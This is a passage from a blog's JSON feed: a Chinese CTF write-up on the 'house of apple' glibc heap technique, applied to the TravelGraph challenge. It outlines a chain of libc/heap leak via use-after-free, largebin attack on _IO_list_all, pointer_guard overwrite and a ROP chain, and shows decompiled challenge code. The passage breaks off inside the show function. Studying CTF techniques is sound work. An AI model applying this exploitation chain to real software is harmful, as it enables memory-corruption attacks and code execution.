{
    "version": "https://jsonfeed.org/version/1",
    "title": "null • All posts by \"house系列\" tag",
    "description": "欢迎来到Huan的笔记空间~~~~~~🌸",
    "home_page_url": "https://yhuanhuan01.github.io",
    "items": [
        {
            "id": "https://yhuanhuan01.github.io/2024/08/30/house-of-apple/",
            "url": "https://yhuanhuan01.github.io/2024/08/30/house-of-apple/",
            "title": "house-of-apple",
            "date_published": "2024-08-30T07:50:08.000Z",
            "content_html": "<h1 id=\"house-of-apple\"><a class=\"markdownIt-Anchor\" href=\"#house-of-apple\">#</a> house-of-apple</h1>\n<blockquote>\n<p>前言:</p>\n<p>正好打 24 年羊城杯做了看了一道 house-of-apple 的题目，拿来水水 blog。</p>\n</blockquote>\n<p>漏洞成因</p>\n<blockquote>\n<p>堆溢出写，uaf</p>\n</blockquote>\n<p>适用范围</p>\n<blockquote>\n<ul>\n<li><code>2.23</code> —— 至今</li>\n<li>程序从  <code>main</code>  函数返回或能调用  <code>exit</code>  函数</li>\n<li>能泄露出  <code>heap</code>  地址和  <code>libc</code>  地址</li>\n<li>能使用一次  <code>largebin attack</code> （一次即可）</li>\n</ul>\n</blockquote>\n<blockquote>\n<p>接下来直接去将这道题的做题手法</p>\n</blockquote>\n<h3 id=\"travelgraph\"><a class=\"markdownIt-Anchor\" href=\"#travelgraph\">#</a> TravelGraph</h3>\n<blockquote>\n<p>利用手法</p>\n</blockquote>\n<ul>\n<li>通过构造合理堆块，free 后残留指针泄露 libc 和 heap</li>\n<li>利用堆风水，构造 <code>1</code>  次 <code>largebin attack</code> ，替换 <code>_IO_list_all</code>  为堆地址</li>\n<li>利用 <code>house of apple</code> ，修改掉 <code>pointer_guard</code>  的值</li>\n<li>利用 <code>house of emma</code>  并结合几个 <code>gadgets</code>  控制 <code>rsp</code></li>\n<li>用 <code>rop</code>  链输出 <code>flag</code></li>\n</ul>\n<p><img data-src=\"/img/house-of-apple/image-20240830110226247.png\" alt=\"image-20240830110226247\"></p>\n<blockquote>\n<p>可见符号表并没有去掉</p>\n</blockquote>\n<p><img data-src=\"/img/house-of-apple/image-20240830110405090.png\" alt=\"image-20240830110405090\"></p>\n<blockquote>\n<p>保护也是理所当然的全开了</p>\n</blockquote>\n<p>接下来分析函数</p>\n<p><code>get_city_name</code></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>__int64 <span class=\"token function\">get_city_name</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+Ch] [rbp-24h]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">char</span> s2<span class=\"token punctuation\">[</span><span class=\"token number\">24</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+10h] [rbp-20h] BYREF</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> __int64 v3<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+28h] [rbp-8h]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  v3 <span class=\"token operator\">=</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Please input the city name\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token function\">read_str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>__int64<span class=\"token punctuation\">)</span>s2<span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">></span> <span class=\"token number\">4</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>      <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span><span class=\"token function\">strcmp</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>cities<span class=\"token punctuation\">[</span><span class=\"token number\">16</span> <span class=\"token operator\">*</span> i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> s2<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>      <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>i<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><code>add</code></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">unsigned</span> __int64 <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> v1<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+8h] [rbp-28h]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+Ch] [rbp-24h]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  _DWORD <span class=\"token operator\">*</span>v3<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+10h] [rbp-20h]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">char</span> s2<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+1Eh] [rbp-12h] BYREF</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> __int64 v5<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+28h] [rbp-8h]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  v5 <span class=\"token operator\">=</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> routes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"What kind of transportation do you want? car/train/plane?\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token function\">read_str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>__int64<span class=\"token punctuation\">)</span>s2<span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span><span class=\"token function\">strcmp</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"car\"</span><span class=\"token punctuation\">,</span> s2<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    v1 <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span><span class=\"token function\">strcmp</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"train\"</span><span class=\"token punctuation\">,</span> s2<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    v1 <span class=\"token operator\">=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">strcmp</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"plane\"</span><span class=\"token punctuation\">,</span> s2<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>      <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    v1 <span class=\"token operator\">=</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>  v3 <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">16</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>v1 <span class=\"token operator\">+</span> <span class=\"token number\">80</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>  v3<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"From where?\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>  <span class=\"token operator\">*</span>v3 <span class=\"token operator\">=</span> <span class=\"token function\">get_city_name</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"To where?\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>  v3<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">get_city_name</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"How far?\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>  v3<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">read_num</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>v3<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">></span> <span class=\"token number\">1000</span> <span class=\"token operator\">||</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>v3<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"That's too far!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Note:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>  <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> v3 <span class=\"token operator\">+</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token number\">16</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>v1 <span class=\"token operator\">+</span> <span class=\"token number\">79</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>  routes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v3<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>  <span class=\"token keyword\">return</span> v5 <span class=\"token operator\">-</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>这里通过出行方式去设置 malloc 的 size 大小，输入距离不能超过 1000，同样是通过 size 大小读入数据，无堆溢出。</p>\n<p><code>delete</code></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  __int64 v0<span class=\"token punctuation\">;</span> <span class=\"token comment\">// rax</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+4h] [rbp-Ch]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">int</span> city_name<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+8h] [rbp-8h]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">int</span> v4<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+Ch] [rbp-4h]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"From where?\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  city_name <span class=\"token operator\">=</span> <span class=\"token function\">get_city_name</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"To where?\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token function\">LODWORD</span><span class=\"token punctuation\">(</span>v0<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token function\">get_city_name</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  v4 <span class=\"token operator\">=</span> v0<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">!=</span> <span class=\"token number\">20</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    v0 <span class=\"token operator\">=</span> routes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v0 <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> city_name <span class=\"token operator\">==</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>routes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;&amp;</span> v4 <span class=\"token operator\">==</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>routes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">4LL</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token operator\">||</span> <span class=\"token punctuation\">(</span><span class=\"token function\">LODWORD</span><span class=\"token punctuation\">(</span>v0<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>routes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> v4 <span class=\"token operator\">==</span> <span class=\"token punctuation\">(</span>_DWORD<span class=\"token punctuation\">)</span>v0<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span><span class=\"token function\">LODWORD</span><span class=\"token punctuation\">(</span>v0<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>routes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">4LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> city_name <span class=\"token operator\">==</span> <span class=\"token punctuation\">(</span>_DWORD<span class=\"token punctuation\">)</span>v0<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>routes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>routes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">4LL</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>routes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token function\">LODWORD</span><span class=\"token punctuation\">(</span>v0<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Successfully delete!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>  <span class=\"token keyword\">return</span> v0<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>存在 uaf 漏洞</p>\n<p><code>show</code></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  __int64 v0<span class=\"token punctuation\">;</span> <span class=\"token comment\">// rax</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+4h] [rbp-Ch]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">int</span> city_name<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+8h] [rbp-8h]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">int</span> v4<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+Ch] [rbp-4h]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"From where?\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  city_name <span class=\"token operator\">=</span> <span class=\"token function\">get_city_name</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"To where?\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token function\">LODWORD</span><span class=\"token punctuation\">(</span>v0<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token function\">get_city_name</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  v4 <span class=\"token operator\">=</span> v0<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">!=</span> <span class=\"token number\">20</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    v0 <span class=\"token operator\">=</span> routes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v0 <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> city_name <span class=\"token operator\">==</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>routes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;&amp;</span> v4 <span class=\"token operator\">==</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>routes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">4LL</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token operator\">||</span> <span class=\"token punctuation\">(</span><span class=\"token function\">LODWORD</span><span class=\"token punctuation\">(</span>v0<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>routes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> v4 <span class=\"token operator\">==</span> <span class=\"token punctuation\">(</span>_DWORD<span class=\"token punctuation\">)</span>v0<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span><span class=\"token function\">LODWORD</span><span class=\"token punctuation\">(</span>v0<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>routes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">4LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> city_name <span class=\"token operator\">==</span> <span class=\"token punctuation\">(</span>_DWORD<span class=\"token punctuation\">)</span>v0<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>      <span class=\"token 